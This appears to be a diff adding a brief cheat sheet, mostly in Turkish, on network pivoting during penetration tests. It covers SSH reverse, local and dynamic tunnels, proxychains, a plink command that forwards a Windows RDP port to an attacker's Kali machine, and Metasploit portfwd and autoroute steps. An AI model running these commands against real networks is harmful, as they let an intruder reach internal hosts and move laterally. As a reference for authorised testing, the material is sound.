@@ -1,0 +1,36 @@
+SSH Tunneling
+
+ssh -R 81:<hedefmakinaipadresi>:80 user@saldırganip -:- "ssh -R 81:192.168.1.1:80 root@192.168.1.2" örnek saldırgan hedef cihaz üzerinde ssh tünellemesi yapmaktadır.
+ssh -D 1234 <hedefcihaz> : burada dinamik port yönlendirmesi ile ssh bağlantısı üzerinden tünelleme yapılıyor yapılıyor. Socks proxi kullanılarak tarayıcı üzerinden bağlantı sağlanablir proxchains.conf düzenlenelerek portlara erişim sağlanabilir.
+nano /etc/proxychains.conf // dinamik tünelleme sonrası 127.0.0.1 1234 değiştir.
+proxychains nc 127.0.0.1 25 //dinamik tünelleme sonrası proxychains ile saldırgan karşı cihaz üzerinde portlara erişim sağlayabilir.
+
+
+# send the traffic of Windows from 3389 to 3390 of attacker (kali)
+C:\> plink -l root -pw kalisshpasswd <kali IP> -R 3390:127.0.0.1:3389 
+
+# on Kali, start rdp to get port 3389 of windows
+# rdesktop 127.0.0.1:3390 
+
+-------------------------
+/etc/hosts dosyasını düzenle 
+ssh -L 443:twitter.com:443 root@192.168.1.61
+
+------------------------
+Metasploit
+
+meterpreter> portfwd list 
+portfwd add –l 3389 –p 3389 –r target-host 
+portfwd delete –l 3389 –p 3389 –r target-host 
+portfwd flush 
+
+-------------------------
+Metasploit 2 
+
+run autoroute -s 192.168.15.0/24 
+use auxiliary/server/socks4a 
+run autoroute -p 
+----------------------manuel route ekleme-----------------
+route add 192.168.14.0 255.255.255.0 3 
+route delete 192.168.14.0 255.255.255.0 3 
+route flush 
